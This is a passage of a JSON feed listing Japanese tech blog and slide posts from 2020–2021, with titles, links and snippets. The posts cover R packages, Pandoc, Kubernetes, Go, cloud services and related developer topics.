Yasumoto","authorId":"atusy"},{"title":"tidymodelsのrecipesパッケージがworkflowsパッケージの使用を推奨し始めた","link":"https://blog.atusy.net/2021/07/01/tidymodels/","contentSnippet":"tidymodelsを使ったモデリングにおいて、recipesパッケージは特徴量エンジニアリングを担います。従来、recipesパッケージは単体で、特徴量抽エンジニアリング方法の","isoDate":"2021-07-01T00:00:00.000Z","dateMiliSeconds":1625097600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Isn’t it troublesome to set the log file in python? Use LoggerGenerator","link":"https://daisuke1024akagawa.medium.com/isnt-it-troublesome-to-set-the-log-file-in-python-use-loggergenerator-8e6483843bd3?source=rss-c54ac439ad2b------2","isoDate":"2021-06-30T06:06:24.000Z","dateMiliSeconds":1625033184000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"Pandocでは--include-in-header引数とheader-includes変数は共存できない","link":"https://blog.atusy.net/2021/06/30/pandoc-header-includes/","contentSnippet":"ちょっとハマった。Pandocでマークダウンファイルを変換する場合、YAMLフロントマターの設定と引数を用いた設定では、引数が優先権を持つ。で、HTMLファイルのhead要素内に記述を追加する場合は","isoDate":"2021-06-30T00:00:00.000Z","dateMiliSeconds":1625011200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"\uD83E\uDD1D\uD83C\uDFFB 依存関係と依存オブジェクト注入","link":"https://speakerdeck.com/hiroki_hasegawa/yi-cun-guan-xi-toyi-cun-obuziekutozhu-ru","contentSnippet":"社内LTにて、依存関係と依存オブジェクト注入を布教しようと試みましたʕ◔ϖ◔ʔ\\r\\r関連テーマ（ドメイン駆動設計と依存性逆転の原則）：\\rhttps://speakerdeck.com/hiroki_hasegawa/domeinqu-dong-she-ji-toyi-cun-xing-ni-zhuan-falseyuan-ze","isoDate":"2021-06-25T04:00:00.000Z","dateMiliSeconds":1624593600000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"Tidymodelsでデータの前処理内容を**tidy**に確認する（公式手順）","link":"https://blog.atusy.net/2021/06/23/tidy-inspect-tidymodels-preprocessing/","contentSnippet":"昨日の投稿で、tidymodelsのrecipesパッケージによる特徴量エンジニアリングを行った歳に、中心化につかった平均値はいくつかPCAの固有ベクトルはなにかをnot tidyに確認する方法を紹介しました。後から気付いたのですが、recipesパッケージはbroom::tidy関数を使って確認する方法を提供しています。tidyじゃ何をtidyにするかわからんし、もうちょい良い名前をつけて欲しいですね。さておき、試してみましょう。","isoDate":"2021-06-23T00:00:00.000Z","dateMiliSeconds":1624406400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Tidymodelsでデータの前処理内容を確認する","link":"https://blog.atusy.net/2021/06/22/inspect-tidymodels-preprocessing/","contentSnippet":"tidymodelsはRにおける統計モデリングや機械学習を便利にするためのフレームワークです。tidymodelsを利用するとパイプ演算子による処理の流れが明瞭なモデリングパッケージごとに異なる学習・予測インターフェースの統一といったメリットを享受でき、徐々にはやってきている印象です。","isoDate":"2021-06-22T00:00:00.000Z","dateMiliSeconds":1624320000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"HTML+CSSでaとかcodeとかの前後に空白を入れつつ、段落の左端を揃える","link":"https://blog.atusy.net/2021/06/21/css-inline-pseudo-margins/","contentSnippet":"p a.normal::before,p a.normal::after { content: none;}日本語の場合、単語の間にスペースを入れないため、リンクやコードと平文が地続きになりがちです。ちょっと空白を入れたい時は以下のようなCSSが活躍します。リンクを例にとってみましょう。p a::before,p a::after { content: \\" \\";  font-size: 0; word-spacing: 1rem;}リンクの前後に余白ではなく空白（半角スペース）を使うところがミソです。また、ここではあえて大袈裟に1remの空白を入れて、以下の例でわかりやすくしています。","isoDate":"2021-06-21T00:00:00.000Z","dateMiliSeconds":1624233600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"denops.vimを使って引用符と括弧を操作するVimのプラグインを書いた","link":"https://zenn.dev/tayusa/articles/58d1c20172f662","contentSnippet":"はじめにかねてから、Denoを触ってみたいけど肝心の作るものがないなと思っていました。そんな矢先にたまたまdenops.vimとの邂逅を果たしたので、昔作ったプラグインを書き直してみました。denops.vimについてはhttps://github.com/vim-denops/denops.vimhttps://zenn.dev/lambdalisue/articles/b4a31fba0b1ce95104c9 作ったものhttps://github.com/atsuya0/dps-surrounding.vim題目のとおり、引用符と括弧を操作するvimのプラグイ...","isoDate":"2021-06-13T15:41:53.000Z","dateMiliSeconds":1623598913000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Kustomize でスラッシュを含むパスにパッチを当てる","link":"https://zenn.dev/toshikish/articles/38896bb9ae1913","contentSnippet":"背景Kustomize では JSON Patch を用いて base のマニフェストにパッチを当てることができます。例えば，以下のマニフェストdeployment.yamlapiVersion: apps/v1kind: Deploymentmetadata:  labels:    app.kubernetes.io/name: myapp    app.kubernetes.io/version: v1.0.0    name: myapp    version: v1.0.0...の version の値を v1.0.1 に変えたい場合は，以下の...","isoDate":"2021-05-31T07:34:24.000Z","dateMiliSeconds":1622446464000,"authorName":"toshikish","authorId":"toshikish"},{"title":"\uD83D\uDC2D Goに入門しよう","link":"https://speakerdeck.com/hiroki_hasegawa/goniru-men-siyou","contentSnippet":"社内LTにて、Goを布教しようと試みましたʕ◔ϖ◔ʔ","isoDate":"2021-05-27T04:00:00.000Z","dateMiliSeconds":1622088000000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"PandocでWord出力する時にヘッダーやフッターの内容を動的に変更する","link":"https://blog.atusy.net/2021/05/23/pandoc-word-dynamic-header-and-footer/","contentSnippet":"Pandocで出力するdocxファイルに好みの書式設定などを反映するには、スタイルを設定済みのdocxファイルを用意しておき、そのファイルのパスを--reference-docオプションに指定します（以下リファレンスファイル）。スタイルのカスタマイズや作成方法は以下を参考にしてください。","isoDate":"2021-05-23T00:00:00.000Z","dateMiliSeconds":1621728000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"♾️ SREに入門しよう","link":"https://speakerdeck.com/hiroki_hasegawa/sreniru-men-siyou","contentSnippet":"社内LTにて、SRE用語を布教しようと試みましたʕ◔ϖ◔ʔ","isoDate":"2021-05-07T04:00:00.000Z","dateMiliSeconds":1620360000000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"minidown 0.1.0をリリース","link":"https://blog.atusy.net/2021/04/04/minidown-0-1-0/","contentSnippet":"minidown 0.1.0をCRANにリリース。タブセット機能の追加、サイドバーに目次を表示した時のレイアウト改善などが主な変更です。","isoDate":"2021-04-04T00:00:00.000Z","dateMiliSeconds":1617494400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"ftExtra 0.2.0をリリース！","link":"https://blog.atusy.net/2021/03/29/ftextra-0-2-0/","contentSnippet":"脚注、引用文献、段落の扱いを改善しつつ、処理速度も大幅改善","isoDate":"2021-03-29T00:00:00.000Z","dateMiliSeconds":1616976000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"\uD83D\uDC2D Lambda関数をGoで実装してみた話","link":"https://speakerdeck.com/hiroki_hasegawa/lambdaguan-shu-wogodeshi-zhuang-sitemitahua","contentSnippet":"社内LTにて、Goを布教しようと試みましたʕ◔ϖ◔ʔ","isoDate":"2021-03-26T04:00:00.000Z","dateMiliSeconds":1616731200000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"Tokyo.R 90でRStudio PBCに転職しようとした時の話をした","link":"https://blog.atusy.net/2021/03/11/tokyor90/","contentSnippet":"Tokyo.R 90でもBoothの頒布物でも語っていない裏話。","isoDate":"2021-03-11T00:00:00.000Z","dateMiliSeconds":1615420800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"VolumePluginの仕組みと実装解説","link":"https://speakerdeck.com/kyohmizu/volumepluginfalseshi-zu-mitoshi-zhuang-jie-shuo","contentSnippet":"勉強会の資料です。\\rhttps://k8sinternal.connpass.com/event/203946/","isoDate":"2021-02-22T05:00:00.000Z","dateMiliSeconds":1613970000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"dplyr 1.0.4で複数列を対象としたfilterが簡単になった","link":"https://blog.atusy.net/2021/02/03/dplyr-1-0-4/","contentSnippet":"dplyr 1.0.0から導入されたacross関数は、mutate関数やsummarize関数を複数列に簡単に適用できる便利な道具です。*_atや*_ifといった関数を過去のものにした他、group_byでも使えるなど、使いどころは多いです。","isoDate":"2021-02-03T00:00:00.000Z","dateMiliSeconds":1612310400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"July Tech Festa 2021 winterで発表&運営スタッフをしました","link":"https://bells17.medium.com/july-tech-festa-2021-winter%E3%81%A7%E7%99%BA%E8%A1%A8-%E9%81%8B%E5%96%B6%E3%82%B9%E3%82%BF%E3%83%83%E3%83%95%E3%82%92%E3%81%97%E3%81%BE%E3%81%97%E3%81%9F-385e7e18aac4?source=rss-713cf42ce34d------2","isoDate":"2021-01-26T04:26:28.000Z","dateMiliSeconds":1611635188000,"authorName":"bells17","authorId":"bells17"},{"title":"R MarkdownでBootstrap 4を使えるようになった","link":"https://blog.atusy.net/2021/01/21/rmd-bs4/","contentSnippet":"GitHub版のrmarkdownパッケージのhtml_document関数がBootstrap 4に対応しました。本記事ではどんなことができるのか紹介します。が、同じ内容をhtml_documentでBootstrap 4を使ってレンダリングしてみたので、そちらを参考にして下さい。","isoDate":"2021-01-21T00:00:00.000Z","dateMiliSeconds":1611187200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"AWS ソリューションアーキテクト アソシエート合格までのまとめ","link":"https://qiita.com/dirtymosschan/items/da3eebdf6b7be9c3eb67","contentSnippet":"#目次#0. はじめに先日、AWS ソリューションアーキテクト アソシエート に合格したので、忘れないうちに色々とアウトプットしておこうと思います。これから受験を考えている方の役にたてればと思い…","isoDate":"2021-01-19T13:11:47.000Z","dateMiliSeconds":1611061907000,"authorName":"Yu Kaneko","authorId":"mos914"},{"title":"minidownで目次をハイライトできるようにした","link":"https://blog.atusy.net/2021/01/14/minidown-toc-highlight/","contentSnippet":"minidown::mini_documentはrmarkdown::html_documentを軽量化しつつ同等以上の機能提供を目指すR Markdown用HTMLフォーマットです。","isoDate":"2021-01-14T00:00:00.000Z","dateMiliSeconds":1610582400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"blogdownで記事のテンプレートを用意する","link":"https://blog.atusy.net/2020/12/25/blogdown-archettype/","contentSnippet":"blogdownではR Markdownを使ったウェブサイトの作成ができます。名前の通り、ブログを念頭に置いたパッケージです。ドキュメントは以下にあります。ググると日本語の記事もそれなりに出てきます。","isoDate":"2020-12-25T00:00:00.000Z","dateMiliSeconds":1608854400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Pandocで出力形式に依存せず見出し番号をつけたり、第1章とか第1.1節とか装飾したい","link":"https://blog.atusy.net/2020/12/24/decorate-section-numbers-on-any-format-with-pandoc/","contentSnippet":"昨日はHTML出力の場合に限って、見出し番号の装飾方法を紹介しました。PandocでHTML出力時に見出し番号を第1章とか第1.1節とかしたいただ、昨日の段階ではどの方法も一長一短だったので、今日は任意の出力に対応するLuaフィルタを用意しました。","isoDate":"2020-12-24T00:00:00.000Z","dateMiliSeconds":1608768000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"2020年にKubernetse関連で取り組んだことまとめ","link":"https://bells17.medium.com/2020-kubernetse-4771e660a174?source=rss-713cf42ce34d------2","isoDate":"2020-12-23T16:04:00.000Z","dateMiliSeconds":1608739440000,"authorName":"bells17","authorId":"bells17"},{"title":"PandocでHTML出力時に見出し番号を第1章とか第1.1節とかしたい","link":"https://blog.atusy.net/2020/12/23/decorate-section-numbers-on-pandoc/","contentSnippet":"Pandoc単体では見出し番号を装飾してくれません。HTML出力の場合、Luaフィルタ、CSS、JavaScriptと3つほど選択肢があるので、それぞれの方法とメリット・デメリットを紹介します。","isoDate":"2020-12-23T00:00:00.000Z","dateMiliSeconds":1608681600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"GCP の Identity Aware-Proxy を使って SSH した話","link":"https://qiita.com/dirtymosschan/items/fd11001daa68d7c8d943","contentSnippet":"#Cloud Identity Aware-Proxy とは？一言で表すと、Google のアカウントを使ってセキュアにリソースに接続できるプロキシサービスです。###何ができる？GCP 上の…","isoDate":"2020-12-22T11:20:18.000Z","dateMiliSeconds":1608636018000,"authorName":"Yu Kaneko","authorId":"mos914"},{"title":"gRPC-WebとGoとVue.jsで簡素なチャット","link":"https://qiita.com/atsuya0/items/f994ca9d820d307daffd","contentSnippet":"はじめに何だか良くわからないけどよく聞くgRPC-Webなるものを触りだけでも理解すべく辛うじてチャット呼べそうなものを作ってみました。概要gRPCとはhttps://grpc.io/Pr…","isoDate":"2020-12-17T17:06:43.000Z","dateMiliSeconds":1608224803000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"VolumePlugin がボリュームを作成・マウントするしくみ","link":"https://qiita.com/kyohmizu/items/40bee7037e1ce7949772","contentSnippet":"はじめにPod の作成時、pod.spec.volumes に記述したボリュームがコンテナにマウントされます。マウントされる Node 側のボリュームを、VolumePlugin がどのように作…","isoDate":"2020-12-17T10:54:47.000Z","dateMiliSeconds":1608202487000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Tidymodelsで使えるモデルの紹介とモデルの追加方法","link":"https://blog.atusy.net/2020/12/13/add-parsnip-model/","contentSnippet":"Tidymodelsが標準で提供するモデルと追加で提供するモデルについて軽く紹介し、更に自前でモデルを組んでみます。Rアドベントカレンダー、12/14の記事です。","isoDate":"2020-12-13T00:00:00.000Z","dateMiliSeconds":1607817600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Sidekiqのジョブをパフォーマンスを考えて削除する","link":"https://qiita.com/atsuya0/items/30d6259766a9a0d5103d","contentSnippet":"はじめにRailsで処理を何らかの理由で遅延させた場合や非同期に処理を行いたいときに多くの人がActive Jobを使用していると思います。とても便利で良いやつなのですがキューに積んだジョブを削…","isoDate":"2020-12-12T17:37:05.000Z","dateMiliSeconds":1607794625000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"任意のファイルをPNGファイルで隠してみる","link":"https://qiita.com/atsuya0/items/a8ccbc9637c37cdf967e","contentSnippet":"はじめにある日、私はファイルを連結したらどうなるんだろうという好奇心に逆らえず、おもむろに連結して確かめてみることにしました。結果、その連結したファイルは普通にファイルとして使えることがわかりま…","isoDate":"2020-12-12T14:56:30.000Z","dateMiliSeconds":1607784990000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Luaフィルタがアツイ2020","link":"https://blog.atusy.net/2020/12/07/lua-filter-is-hot/","contentSnippet":"Pandoc Advent Calendar 2020の12/7の記事です。多様なドキュメントフォーマット間を変換できるPandocでは、「フィルター」という機能を使って、変換処理に割り込みをかけることができます。","isoDate":"2020-12-07T00:00:00.000Z","dateMiliSeconds":1607299200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"R MarkdownやPandocでMarkdown出力する時に数式をベクター画像化する","link":"https://blog.atusy.net/2020/11/15/pandoc-webtex-svg/","contentSnippet":"--webtex=https://latex.codecogs.com/svg.latex?と指定するとSVG画像化した高品質な数式を得られるよ。","isoDate":"2020-11-15T00:00:00.000Z","dateMiliSeconds":1605398400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"R MarkdownやPandocでMarkdown出力する時に数式をPNG画像化する","link":"https://blog.atusy.net/2020/11/08/math-in-markdown/","contentSnippet":"R MarkdownやPandocは数式をレンダリングする方法をいくつか提供しています1。代表的な方法にMathJaxやKaTeXがありますが、これらはJavaScriptで実装されているため、出力形式がマークダウンで、ビューアーがGitHubのような場合、利用できません。","isoDate":"2020-11-08T00:00:00.000Z","dateMiliSeconds":1604793600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"pinsパッケージならリモートファイルをローカルと別のリモートキャッシュできる","link":"https://blog.atusy.net/2020/11/04/pins/","contentSnippet":"さわりのさわりなので、詳しくは公式を参照してね。pins::pin関数を使うと、Web上のリソースをキャッシュできる。デフォルトではローカルにキャッシュする。使い方は簡単で、関数に与えるURLをpins::pin関数でラッピングしておくだけ。","isoDate":"2020-11-04T00:00:00.000Z","dateMiliSeconds":1604448000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"#OsakaR で2回目のもくもく会を開催しました","link":"https://blog.atusy.net/2020/11/02/osakar-mokumoku-2/","contentSnippet":"2020/10/31に開催しました。第1回は2020/6/6だったので、実に4ヶ月ぶり。もう少し頻度をあげたいとろですが、家族や他の勉強会とのバランスを考えると中々難しいところです。今回は私がRStudio PBCのテーブルコンテストに参戦したく、追い込みをかけるために突如企画した、というのが内情だったりします。昨日の記事にした通り、無事投稿しました。せっかくなので徒然と記録や思いを残しておきます。","isoDate":"2020-11-02T00:00:00.000Z","dateMiliSeconds":1604275200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"RStudio PBCのテーブルコンテストに投稿しました","link":"https://blog.atusy.net/2020/11/01/rstudio-table-contest/","contentSnippet":"2019年のShinyコンテストに続き、2020年は表コンテストが開催されました（開催案内）。実用的なのからネタなものまで幅広くテーブルを募るもので、投稿期間は9/15から10/31でした。大枠としては、Single Table Example: 面白い構造をした表、便利な機能や特殊な機能を使った表、特定の分野で用いられる表などTutorial: パッケージの機能紹介を通して素敵な表を組む方法をまとめるOtherで、更に表の形式として","isoDate":"2020-11-01T00:00:00.000Z","dateMiliSeconds":1604188800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"PandocでHTML出力する時の数式の扱い","link":"https://blog.atusy.net/2020/10/31/pandoc-math-rendering-engines/","contentSnippet":"基本はMath rendering in HTMLに記載の通り。--mathjaxや--katexはJavaScriptやCSSの読み込みをするだけで数式部分の出力は変わらないと思ってたけど、そうでもなかったのでメモがてら全パターンを試す。","isoDate":"2020-10-31T00:00:00.000Z","dateMiliSeconds":1604102400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"ベクトルから要素を除去する方法とsetdiffの罠","link":"https://blog.atusy.net/2020/10/27/remove-elements-from-vector/","contentSnippet":"以下のxからyを除去してみましょう。x <- c(\'banana\', \'banana\', \'apple\', \'grape\')y <- c(\'apple\', \'grape\')%in%演算子を使えばxの要素がyに含まれているか判定できるので、簡単ですね。x[!x %in% y]#> [1] \\"banana\\" \\"banana\\"もっと簡単「そう」な方法に、setdiff関数があります。ただしこいつは中でunique関数をかけている点に注意が必要です。","isoDate":"2020-10-27T00:00:00.000Z","dateMiliSeconds":1603756800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Kubernetes Internal #1を開催しました","link":"https://bells17.medium.com/kubernetes-internal-1-ea0f1adcfe33?source=rss-713cf42ce34d------2","isoDate":"2020-10-19T10:29:31.000Z","dateMiliSeconds":1603103371000,"authorName":"bells17","authorId":"bells17"},{"title":"R MarkdownでHTML出力時に見出しのURLを簡単に取得できるようにした","link":"https://blog.atusy.net/2020/10/18/rmd-anchor-sections/","contentSnippet":"このブログでも使えてます。ここにマウスを重ねると#記号が見出しの最後に現れ、クリックするとブラウザのURL覧から見出しのURLを取得できるようにしました（PR #1884）。#記号を右クリックしてメニューからCopy link locationとかしてもOK。","isoDate":"2020-10-18T00:00:00.000Z","dateMiliSeconds":1602979200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Istio の timeout, retry, circuit breaking, etc","link":"https://medium.com/@yteraoka/istio-%E3%81%AE-timeout-retry-circuit-breaking-etc-c170285447e8?source=rss-8b55af126a13------2","isoDate":"2020-10-17T14:52:08.000Z","dateMiliSeconds":1602946328000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"オープンソースソフトウェア開発の貢献に必要なスキルは何かとインタビューされた","link":"https://blog.atusy.net/2020/10/04/contributing-oss/","contentSnippet":"とある筋からオープンソースソフトウェア開発への貢献に必要なスキルセットは何かとインタビューを受けた。氏の研究に必要らしくて受けたが、今日のことをブログにしても構わないとのことだったので、ちょっとメモがてら書き残しておこう。","isoDate":"2020-10-04T00:00:00.000Z","dateMiliSeconds":1601769600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"AWS CDK on Scala ~ Scalaでインフラ管理してみたはなし / Manage infrastructure with AWS CDK on Scala","link":"https://speakerdeck.com/nomadblacky/manage-infrastructure-with-aws-cdk-on-scala","contentSnippet":"https://scala-tokyo.connpass.com/event/187140/","isoDate":"2020-09-25T04:00:00.000Z","dateMiliSeconds":1601006400000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"ggplot2で列の値をそのまま色の値にしつつレジェンドも表示する（`scale_*_identity`関数）","link":"https://blog.atusy.net/2020/09/21/ggplot-scale-identity-with-legend/","contentSnippet":"ggplot2パッケージではscale_*_identityという名前の関数を使うと、審美的属性にマッピングした列の値をそのまま色やサイズ、透明度に反映できます。ただし、デフォルトでは凡例が表示されません。","isoDate":"2020-09-21T00:00:00.000Z","dateMiliSeconds":1600646400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"ggplot2とplotlyで作成したグラフから凡例を残してデータを非表示にする","link":"https://blog.atusy.net/2020/09/19/ggplotly-legend-visibility/","contentSnippet":"plotlyで作成したグラフは凡例をクリックすると、データの表示・非表示を変更できます。ではデフォルトで一部の凡例を非表示にする方法はあるでしょうか。","isoDate":"2020-09-19T00:00:00.000Z","dateMiliSeconds":1600473600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"kubeadmの共通処理の実装","link":"https://bells17.medium.com/kubeadm-common-implementation-a5e5b3890dde?source=rss-713cf42ce34d------2","isoDate":"2020-09-12T19:22:01.000Z","dateMiliSeconds":1599938521000,"authorName":"bells17","authorId":"bells17"},{"title":"Kubernetes (k8s) 管理者用GUI Lens","link":"https://qiita.com/tozastation/items/804949c69df5d53643c6","contentSnippet":"Lensとはlensapp/lensk8sで動作する全てのリソースをモニタリングしてくれるGUIアプリLinux/Mac/Windowsで動作するこんな感じ（kindで作ったクラスタ見てます）…","isoDate":"2020-09-07T12:53:18.000Z","dateMiliSeconds":1599483198000,"authorName":"tozastation","authorId":"tozastation"},{"title":"パッケージのチェックをR-hubのあらゆるプラットフォームで実行し通す","link":"https://blog.atusy.net/2020/09/07/rhub-test-all-for-cran/","contentSnippet":"結論rhub::check_for_cran(platforms = rhub::platforms()$name)負担かけすぎるのもよくないのでほどほどに。背景からCRANに投稿する際、2つ以上のプラットフォームでパッケージをチェックすることが推奨されている。","isoDate":"2020-09-07T00:00:00.000Z","dateMiliSeconds":1599436800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"UMAPを異常検知の前処理に使う時に、異常データの一部もUMAPに学習させるとよさそう","link":"https://blog.atusy.net/2020/09/02/umap-outlier/","contentSnippet":"UMAPは高次元データを似たもの同士が近くなるように次元縮約してくれる便利な手法だ。t-SNEよりも高速なことに加え、訓練しておいたモデルを新規データに適用できることも魅力。","isoDate":"2020-09-02T00:00:00.000Z","dateMiliSeconds":1599004800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Slinky で Scala.js 製 React Webアプリケーションを つくったはなし / How to build a Scala.js React web application in Slinky","link":"https://speakerdeck.com/nomadblacky/how-to-build-a-scala-dot-js-react-web-application-in-slinky","contentSnippet":"Scala.js 向けの React フレームワークである Slinky でWebアプリケーションを作成したはなし","isoDate":"2020-08-30T04:00:00.000Z","dateMiliSeconds":1598760000000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"ftExtra 0.0.2、0.0.3をリリースしました","link":"https://blog.atusy.net/2020/08/30/ftextra-0-0-3/","contentSnippet":"ftExtra 0.0.3をリリースしました。0.0.2をリリースしたらCRANにSolarisでうまくvignetteをビルドできねえんだけど、なんとかしないとCRANから消すねって言われて、慌てて0.0.3をリリースしました1。ユーザーレベルで認識できる変更は0.0.2のものです。","isoDate":"2020-08-30T00:00:00.000Z","dateMiliSeconds":1598745600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"PandocやR Markdownでマルチカラムレイアウト","link":"https://blog.atusy.net/2020/08/24/pandoc-columns/","contentSnippet":"スライドを筆頭にしばしば2カラム以上のレイアウトなどを利用したくなりますね。R Markdownの場合、revealjsパッケージでマルチカラムを利用する方法が、私を含め複数の人によって提案されてきました。","isoDate":"2020-08-24T00:00:00.000Z","dateMiliSeconds":1598227200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"R Markdownとrevealjsとluaフィルタでチャンクやブロック要素をincrementalに表示する","link":"https://blog.atusy.net/2020/08/15/incremental-revealjs/","contentSnippet":"","isoDate":"2020-08-15T00:00:00.000Z","dateMiliSeconds":1597449600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"R Markdown Cookbookの原稿をレビューをしました","link":"https://blog.atusy.net/2020/08/10/reviewed-rmarkdown-cookbook/","contentSnippet":"待望の「R Markdown Cookbook」が今年出ます。Webからも閲覧可能です（https://bookdown.org/yihui/rmarkdown-cookbook）。私も小ネタの提供やレビューで協力させて頂き、謝辞に載せていただきました。READMEでは2020年8月出版予定となってますが、多分、遅れるんじゃないかな?","isoDate":"2020-08-10T00:00:00.000Z","dateMiliSeconds":1597017600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Cloud SQLへのprivate ip 接続でハマった話","link":"https://qiita.com/SatohJohn/items/e79f363798a6233f9ad2","contentSnippet":"概要Cloud SQL(MySQL)に対してprivate ipを使ってアクセスしたときに、何をチェックしたかをメモするハマったからにはきちんとログを残す現象GCE から Cloud SQL…","isoDate":"2020-08-07T16:53:50.000Z","dateMiliSeconds":1596819230000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"情報処理安全確保支援士の関連資料","link":"https://kyohmizu.hatenablog.com/entry/2020/08/05/115459","contentSnippet":"情報処理安全確保支援士の業務を行う上で、参照すべき資料一覧です。サイバーセキュリティ基本法（平成二十六年法律第百四号）情報処理の促進に関する法律（昭和四十五年法律第九十号）情報処理学会倫理綱領RFC:1087 倫理とインターネット(Ethics and the Internet)セキュリティ対応組織 (SOC,CSIRT)強化に向けたサイバーセキュリティ情報共有の「5W1H」 v2.0 (2019年4月)JPCERT インシデントハンドリングマニュアルIPA 脆弱性対策の効果的な進め方（ツール活用編）情報セキュリティ早期警戒パートナーシップガイドラインIPA 重要なセキュリティ情報一覧IPA 共通脆弱性評価システムCVSS v3概説JVN (Japan Vulnerability Notes)JVN 脆弱性レポートの読み方JVN iPediaFIRST Common Vulnerability Scoring System SIGCWE (Common Weakness Enumeration)IPA 脆弱性体験学習ツール AppGoatMyJVNIPA 組織における内部不正防止ガイドライン地方公共団体における情報セキュリティポリシーに関するガイドライン(平成30年9月版)IPA 委託関係における情報セキュリティ対策ガイドラインIPA 中小企業の情報セキュリティ対策ガイドラインIPA 情報漏えい対策のしおりNISC スマートフォン等の業務利用における情報セキュリティ対策の実施手順作成手引書個人情報の保護に関する法律についてのガイドラインIPA 企業(組織)における最低限の情報セキュリティ対策のしおりスマートフォンのセキュリティ＜危険回避＞対策のしおりJPCERT/CC 技術メモ - 安全な Web ブラウザの使い方IPA ウェブブラウザのプロテクションプロファイル","isoDate":"2020-08-05T02:54:59.000Z","dateMiliSeconds":1596596099000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"CRANを見据えるならパッケージの機能が最小限の内に送ってしまえ","link":"https://blog.atusy.net/2020/07/27/creating-package/","contentSnippet":"金曜日にchunkhooksパッケージをCRANに送りだしました。コードブロックに行番号をつけたり、fig.widthの単位をインチからミリメートルに変換したり、そんなおお役立ちフックをちょこちょこ盛り込んでいます。","isoDate":"2020-07-27T00:00:00.000Z","dateMiliSeconds":1595808000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"tibbleでカラーコードを示す列を色付けてみる","link":"https://blog.atusy.net/2020/07/23/color-tibble-column/","contentSnippet":"にすぜっとさんのツィートを見かけて挑戦してみました (https://twitter.com/niszet0/status/1286245706504708101)。まっとうな人はformattableとかそーゆーの使った方がいいんじゃないかな。以下のコードをRStudioのコンソールにでもコピペしてみてくださいな。ちなみにR MarkdownではRStudio IDEのpreview画面にも、HTMLなどの出力にも反映されない。","isoDate":"2020-07-23T00:00:00.000Z","dateMiliSeconds":1595462400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"テスト駆動開発してCRANに投げるの大事ネ","link":"https://blog.atusy.net/2020/07/20/cran-package-with-tests/","contentSnippet":"CRANに登録済みのftExtraパッケージはPandocのASTを扱ったりする都合上、内部のデータ操作が結構複雑なので、自分の意図した動作が実現するか随時確認できるように、単体テストを重視していました。","isoDate":"2020-07-20T00:00:00.000Z","dateMiliSeconds":1595203200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"rocker/verse:4.0.2を使おうとして躓いた","link":"https://blog.atusy.net/2020/07/17/rocker-verse-4-0-2/","contentSnippet":"RをDockerで簡単に使えるようにするプロジェクトとしてrockerがあります。こいつ、R 3.x.x系とR 4.x.x系でDockerfileの書き方が結構変わったので、拡張イメージを作っている人は要注意です。","isoDate":"2020-07-17T00:00:00.000Z","dateMiliSeconds":1594944000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"自作キーボードLily 58 ProのスィッチをChoc Red Proに換装した","link":"https://blog.atusy.net/2020/07/13/choc-red-pro/","contentSnippet":"左右分離式のLily 58 